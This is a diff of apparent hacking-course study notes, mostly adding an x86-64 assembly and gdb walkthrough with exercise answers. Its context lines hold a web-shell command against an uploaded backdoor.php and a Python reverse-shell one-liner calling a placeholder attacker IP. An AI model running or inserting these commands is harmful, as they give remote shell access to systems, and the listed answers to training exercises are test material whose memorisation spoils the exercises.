@@ -711,3 +711,186 @@ python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes
 
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<VPN/TUN Adapter IP>",<LISTENER PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 ```
+
+### Intro to Assembly Language
+
+Download the attached file, and find the hex value in 'rax' when we reach the instruction at <_start+16>?
+Break and step
+
+
+```bash
+# Note: The -f elf64 flag is used to note that we want to assemble a 64-bit assembly code. If we wanted to assemble a 32-bit code, we would use -f elf
+nasm -f elf64 helloWorld.s
+# linking
+ld -o helloWorld helloWorld.o
+# Note: if we were to assemble a 32-bit binary, we need to add the '-m elf_i386' flag.
+# executable
+./helloWorld
+```
+
+```bash
+#!/bin/bash
+
+fileName="${1%%.*}" # remove .s extension
+
+nasm -f elf64 ${fileName}".s"
+ld ${fileName}".o" -o ${fileName}
+[ "$2" == "-g" ] && gdb -q ${fileName} || ./${fileName}
+```
+
+```bash
+chmod +x assembler.sh
+./assembler.sh helloWorld.s
+```
+
+```bash
+# disassembling to intel syntax
+objdump -M intel -d helloWorld
+# show assembly code without machine code or addresses
+objdump -M intel --no-show-raw-insn --no-addresses -d helloWorld
+```
+
+```bash
+#The -d flag will only disassemble the .text section of our code. To dump any strings, we can use the -s flag, and add -j .data to only examine the .data section. This means that we also do not need to add -M intel. The final command is as follows:
+objdump -sj .data helloWorld
+```
+
+```bash
+# gdb
+sudo apt-get update
+sudo apt-get install gdb
+# gef
+wget -O ~/.gdbinit-gef.py -q https://gef.blah.cat/py
+echo source ~/.gdbinit-gef.py >> ~/.gdbinit
+# debug
+gdb -q ./helloWorld
+#
+./assembler.sh helloWorld.s -g
+#
+info functions
+info variables
+disas _start
+b _start
+r
+b *_start+10
+b *0x40100a
+c
+# For example, if we wanted to examine the next four instructions in line, we will have to examine the $rip register (which holds the address of the next instruction), and use 4 for the count, i for the format, and g for the size (for 8-bytes or 64-bits). So, the final examine command would be x/4ig $rip, as follow
+x/4ig $rip
+# examine specific memory address
+x/s 0x402000
+# examine in hex format x/wx 0x401000
+x/wx 0x401000
+# curr value of all registers
+registers
+# step one by one
+si
+# step count
+si <NUM>
+# step until exit
+s
+# next and next i
+n
+ni
+# patch
+help patch
+```
+
+Download the attached file, and find the hex value in 'rax' when we reach the instruction at <_start+16>? 
+
+```bash
+cd ~/Downloads
+unzip gdb.zip
+gdb -q gdb
+break *_start+16
+r
+# $rax = 0x21796d6564637708
+```
+Add an instruction at the end of the attached code to move the value in "rsp" to "rax". What is the hex value of "rax" at the end of program execution? 
+Are we moving the value or the address?
+
+```bash
+unzip mov.zip
+# add - mov rax, [rsp]
+bash assembler.sh mov.s
+gdb mov
+r
+# $rax   : 0x400
+```
+
+Add an instruction to the end of the attached code to "xor" "rbx" with "15". What is the hex value of 'rbx' at the end? 
+
+```bash
+unzip arithmetic.zip
+# add xor rbx 15
+bash assembler.sh arithmetic.s
+gdb arithmetic
+r
+# $rbx   : 0x0
+```
+
+Edit the attached assembly code to loop the "loop" label 5 times. What is the hex value of "rax" by the end?
+How many times will it loop?
+
+```bash
+unzip loops.zip
+# add loop loop
+bash assembler.sh loops.s -g
+gdb loops
+r
+# $rax   : 0x100000000
+```
+
+Try to jump to "func" before "loop loop". What is the hex value of "rbx" at the end?
+Will it loop?
+
+```bash
+unzip unconditional.zip
+# add jmp func
+bash assembler.sh unconditional.s
+gdb unconditional
+break *func+3
+r
+# $rbx   : 0x4
+```
+
+The attached assembly code loops forever. Try to modify (mov rax, 5) to make it not loop. What hex value prevents the loop? 
+When will "jnz" not jump?
+
+```bash
+unzip conditional.zip
+# change to mov rax, 2 
+bash assembler.sh conditional.s -g
+r
+# 0x2
+```
+Debug the attached binary to find the flag being pushed to the stack 
+It gradually builds up in "rsp"
+
+```bash
+unzip stack.zip
+bash assembler.sh stack.s -g
+watch $rsp and repeatedly continue
+```
+
+Try assembling and debugging the above code, and note how "call" and "ret" store and retrieve "rip" on the stack. What is the address at the top of the stack after entering "Exit"? (6-digit hex 0xaddress, without zeroes) 
+You can use "ni" to step to the next call, and "si" to step into the call.
+
+```bash
+vim exit.s
+bash assembler.sh exit.s -g
+break Exit
+r
+# $rsp   : 0x00007fffffffdf88  →  0x0000000000401014
+# 0x401014
+```
+
+Try to fix the Stack Alignment in "print", so it does not crash, and prints "Its Aligned!". How much boundary was needed to be added? "write a number" 
+Count pushes/calls so far, each adds 8 bytes, total boundary needed is 16 bytes
+
+```bash
+nasm -f elf64 functions.s &&  ld functions.o -o functions -lc --dynamic-linker /lib64/ld-linux-x86-64.so.2 && ./functions
+# 8
+```
+
+Run the "Exercise Shellcode" to get the flag. 
